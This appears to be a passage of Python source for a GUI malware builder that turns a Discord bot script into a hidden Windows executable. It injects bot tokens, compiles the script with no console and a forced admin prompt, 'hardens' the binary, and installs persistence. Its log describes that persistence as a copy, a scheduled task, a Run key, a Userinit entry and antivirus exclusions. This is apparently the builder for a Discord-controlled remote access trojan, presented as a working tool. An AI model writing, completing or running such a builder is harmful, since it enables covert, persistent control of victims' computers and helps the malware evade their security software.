        colors = {"ok": ("#0f1a16", "#a8ffd8"), "err": ("#1a1113", "#ffb9a8")}
        bgc, fgc = colors.get(level, colors["ok"])
        box = ctk.CTkFrame(self, fg_color=bgc, corner_radius=12, border_width=1, border_color=fgc)
        box.place(relx=1.0, rely=1.0, x=-42, y=-128, anchor="se")
        ctk.CTkLabel(box, text=text, font=ctk.CTkFont(family="Poppins", size=11, weight="bold"),
                     text_color=fgc).pack(padx=18, pady=10)
        self.after(2800, box.destroy)

    def start_compile_thread(self):
        if self.busy or self.btn_compile.cget("state") == "disabled":
            return
        self.busy = True
        self.cancelled = False
        self.build_ok = False
        self.paint_bars(False, 8, 12)
        self.btn_compile.configure(state="disabled", fg_color="#1a1a24", text_color="#6d6d80")
        self.chk_terms.configure(state="disabled")
        self.mode_seg.configure(state="disabled")
        self.btn_cancel.configure(state="normal", fg_color="transparent")
        threading.Thread(target=self.compile_process, daemon=True).start()

    def cancel_build(self):
        if not self.busy or self.cancelled:
            return
        self.cancelled = True
        self.log("cancellation requested", "warn")
        proc = self.proc
        if proc is not None and proc.poll() is None:
            try:
                subprocess.run(["taskkill", "/f", "/t", "/pid", str(proc.pid)], capture_output=True)
            except Exception:
                pass

    def compile_process(self):
        started = time.perf_counter()
        try:
            self._compile()
        except Exception as exc:
            self.log("unhandled exception: {}".format(exc), "err")
            self.update_status("Unexpected error: {}".format(exc), None, "err")
            self.toast("Build failed", "err")
        finally:
            self.log("elapsed: {:.1f}s".format(time.perf_counter() - started), "dim")
            self.after(0, self.reset_ui_state)

    def _mask(self, token):
        if len(token) <= 12:
            return "*" * len(token)
        return "{}…{}".format(token[:6], token[-4:])

    def _compile(self):
        for key, widget in self.inputs.items():
            self.config_data[key] = widget.get()

        tokens = []
        for key in ("token_1", "token_2", "token_3"):
            t = _clean_token(self.config_data.get(key, ""))
            if not t:
                continue
            if not TOKEN_RE.match(t):
                self.log("{} malformed: {}".format(key, self._mask(t)), "warn")
                if key == "token_1":
                    self.update_status("Invalid token format", None, "err")
                    self.toast("Invalid token", "err")
                    return
            tokens.append(t)
        if not tokens:
            self.update_status("Bot token is required", None, "err")
            self.toast("Missing bot token", "err")
            return
        token = tokens[0]

        source_path = SOURCE_FILE
        if not os.path.exists(source_path):
            self.update_status("{} not found".format(SOURCE_FILE), None, "err")
            self.toast("Missing source file", "err")
            return

        project_root = os.getcwd()
        res_src = os.path.join(project_root, "resources")
        if not os.path.isdir(res_src):
            self.update_status("resources/ folder not found next to builder", None, "err")
            self.toast("Missing resources/", "err")
            return

        onefile = self.mode_var.get() == "Single EXE"
        exe_target = re.sub(r'[<>:"/\\|?*]', "", self.config_data["exe_name"].strip())
        if exe_target.lower().endswith(".exe"):
            exe_target = exe_target[:-4]
        if not exe_target:
            exe_target = "app"

        self.log("=" * 62, "dim")
        self.log("BUILD START", "accent")
        self.log("  target      : {}.exe".format(exe_target), "info")
        self.log("  mode        : {}".format("onefile" if onefile else "onedir"), "info")
        self.log("  token       : {}".format(self._mask(token)), "info")
        self.log("  admin       : {}".format(is_admin()), "info")
        self.log("  resources   : {}".format(len(os.listdir(res_src))), "info")
        self.log("  python      : {}".format(sys.version.split()[0]), "dim")
        try:
            import PyInstaller
            self.log("  pyinstaller : {}".format(PyInstaller.__version__), "dim")
        except Exception:
            self.log("  pyinstaller : not importable", "warn")
        self.log("  source size : {}".format(human_size(os.path.getsize(source_path))), "dim")
        for name in sorted(os.listdir(res_src))[:20]:
            full = os.path.join(res_src, name)
            try:
                self.log("    · {} ({})".format(name, human_size(os.path.getsize(full))), "dim")
            except Exception:
                self.log("    · {} (dir)".format(name), "dim")

        if not is_admin():
            self.log("no elevation: persistence step will be skipped", "warn")

        self.update_status("Applying source filters...", 0.06)
        try:
            state = load_filter_state()
            apply_filters_to_file(source_path, state)
            self.log("filters applied: {} cmd / {} features off".format(
                len(state["disabled_commands"]), len(state["disabled_features"])), "dim")
        except Exception as exc:
            self.log("filter step failed: {}".format(exc), "warn")

        self.update_status("Preparing build environment...", 0.10)
        subprocess.run(["taskkill", "/f", "/im", "{}.exe".format(exe_target)], capture_output=True)
        time.sleep(0.8)

        try:
            for d in ("dist", "build"):
                if os.path.exists(d):
                    shutil.rmtree(d, ignore_errors=True)
                    self.log("removed old {}".format(d), "dim")
            os.makedirs("dist", exist_ok=True)

            if os.path.exists("custom_imports.txt"):
                shutil.copy2("custom_imports.txt", os.path.join("dist", "custom_imports.txt"))
                self.log("copied custom_imports.txt", "dim")
            shutil.copytree(res_src, os.path.join("dist", "resources"), dirs_exist_ok=True)
            self.log("staged resources/ ({} entries)".format(len(os.listdir(res_src))), "dim")
            if self.config_data["icon_path"]:
                shutil.copy2(self.config_data["icon_path"], os.path.join("dist", "icon.ico"))
                self.log("staged icon.ico", "dim")
        except Exception as exc:
            self.update_status("Environment prep failed: {}".format(exc), None, "err")
            self.toast("Prep failed", "err")
            return

        if self.cancelled:
            return

        self.update_status("Injecting token...", 0.30)

        with open(source_path, "r", encoding="utf-8") as f:
            lines = f.readlines()

        runner = '''TOKENS = [{list}]
token = TOKENS[0]

def _lm_log(msg):
    try:
        os.makedirs(APP_DIR, exist_ok=True)
        with open(os.path.join(APP_DIR, "boot.log"), "a", encoding="utf-8") as f:
            f.write("[{{}}] {{}}\\n".format(datetime.now(), msg))
    except Exception:
        pass

def _lm_run():
    for t in TOKENS:
        try:
            bot.run(t)
            return
        except discord.LoginFailure as e:
            _lm_log("login failure {{}}: {{}}".format(t[:6], e))
        except discord.PrivilegedIntentsRequired as e:
            _lm_log("intents: {{}}".format(e))
            return
        except Exception as e:
            _lm_log("crash: {{!r}}".format(e))
            time.sleep(15)
            os.execv(sys.executable, [sys.executable] + sys.argv)
    _lm_log("all tokens failed")
    time.sleep(120)
    os.execv(sys.executable, [sys.executable] + sys.argv)
'''.format(list=", ".join('"{}"'.format(t) for t in tokens))

        new_lines, injected = [], False
        for line in lines:
            if not injected and line.startswith("if __name__"):
                new_lines.extend(runner.splitlines(True))
                new_lines.append("\n")
                injected = True
            new_lines.append(line.replace("bot.run(token)", "_lm_run()"))
        if not injected:
            new_lines.append("\n" + runner + "\n")
        self.log("runner injected ({} tokens)".format(len(tokens)), "dim")

        with open(os.path.join("dist", "source_final.py"), "w", encoding="utf-8") as f:
            f.writelines(new_lines)
        self.log("wrote dist/source_final.py ({} lines)".format(len(new_lines)), "dim")

        if self.cancelled:
            return

        self.update_status("Running PyInstaller...", 0.50)
        runtime_dir = build_tmpdir()
        self.log("  runtime dir : {}".format(runtime_dir), "dim")

        original_dir = os.getcwd()
        os.chdir("dist")
        try:
            cmd = [sys.executable, "-m", "PyInstaller", "--noconsole",
                   "--name={}".format(exe_target), "--distpath=.", "--workpath=build",
                   "--specpath=.", "source_final.py",
                   "--onefile" if onefile else "--onedir",
                   "--uac-admin", "--clean",
                   "--runtime-tmpdir={}".format(runtime_dir)]
            if self.config_data["icon_path"]:
                cmd.append("--icon=icon.ico")

            sep = ";" if os.name == "nt" else ":"
            cmd.append("--add-data={}{}resources".format(res_src, sep))
            if os.path.exists("custom_imports.txt"):
                cmd.append("--add-data=custom_imports.txt{}.".format(sep))
            for arg in parse_imports(os.path.join(original_dir, "custom_imports.txt")):
                if arg.startswith("--add-data=resources"):
                    continue
                cmd.append(arg.replace(";", sep))

            self.log("command:", "dim")
            self.log("  {}".format(" ".join(cmd)), "dim")

            proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                                    text=True, bufsize=1, errors="replace")
            self.proc = proc
            lines_out = 0
            for raw in proc.stdout:
                line = raw.rstrip("\r\n")
                if not line:
                    continue
                lines_out += 1
                self.log(line, "dim")
                if lines_out % 4 == 0:
                    self.bump(min(0.84, 0.50 + lines_out * 0.0035))
                if self.cancelled:
                    break
            proc.wait()
            code = proc.returncode
            self.log("pyinstaller exited with {} after {} lines".format(code, lines_out),
                     "ok" if code == 0 else "err")

            if self.cancelled:
                self.update_status("Build cancelled", None, "warn")
                self.toast("Cancelled", "err")
                return
            if code != 0:
                self.update_status("PyInstaller failed (code {})".format(code), None, "err")
                self.toast("Compile failed", "err")
                return

            exe_out = os.path.join(os.getcwd(), "{}.exe".format(exe_target))
            if not os.path.exists(exe_out):
                exe_out = os.path.join(os.getcwd(), exe_target, "{}.exe".format(exe_target))
            if not os.path.exists(exe_out):
                self.update_status("Built binary not found", None, "err")
                self.toast("Binary missing", "err")
                return

            size = os.path.getsize(exe_out)
            digest = hashlib.sha256(open(exe_out, "rb").read()).hexdigest()
            self.log("binary: {}".format(exe_out), "info")
            self.log("  size   : {}".format(human_size(size)), "info")
            self.log("  sha256 : {}".format(digest), "dim")

            self.update_status("Hardening binary...", 0.88)
            hardened = False
            for attempt in range(3):
                if harden_exe(exe_out):
                    hardened = True
                    self.log("hardened on attempt {}".format(attempt + 1), "ok")
                    break
                self.log("hardening attempt {} failed".format(attempt + 1), "warn")
            if not hardened:
                self.log("binary left untouched", "warn")

            self.update_status("Verifying archive...", 0.91)
            try:
                v = subprocess.run(
                    [sys.executable, "-m", "PyInstaller.utils.cliutils.archive_viewer", "-l", exe_out],
                    capture_output=True, text=True, timeout=90)
                if v.returncode != 0 or "PYZ" not in (v.stdout or ""):
                    self.log("ARCHIVE CORRUPT after hardening, rebuild", "err")
                    self.update_status("Archive validation failed", None, "err")
                    self.toast("Corrupt binary", "err")
                    return
                self.log("archive ok ({} entries)".format(len((v.stdout or "").splitlines())), "ok")
            except Exception as exc:
                self.log("validator unavailable: {}".format(exc), "warn")

            self.update_status("Installing persistence...", 0.95)
            result = install_persistence(exe_out, None if onefile else os.getcwd(), runtime_dir)
            if result == "ok":
                self.log("persistence installed (copy + task + runkey + userinit + exclusions)", "ok")
            elif result == "ok-noav":
                self.log("persistence installed but NO exclusions (tamper protection?)", "warn")
            elif result == "no-admin":
                self.log("persistence skipped: not elevated", "err")
            else:
                self.log("persistence failed", "err")

            self.update_status("Build complete", 1.0, "ok")
            self.build_ok = True
            self.after(0, lambda: self.paint_bars(True, 12, 16))
            self.log("BUILD OK  ·  {}  ·  {}".format(human_size(size), digest[:16]), "ok")
            self.log("=" * 62, "dim")
            self.toast("Build complete", "ok")

            output_dir = os.getcwd()
            if os.name == "nt":
                os.startfile(output_dir)
            else:
                os.system('xdg-open "{}"'.format(output_dir))
        finally:
            os.chdir(original_dir)


if __name__ == "__main__":
    try:
        ctypes.windll.shell32.SetCurrentProcessExplicitAppUserModelID("MateAG.LessMi.Builder")
    except Exception:
        pass
    ensure_admin()
    app = ModernBuilder()
    app.mainloop()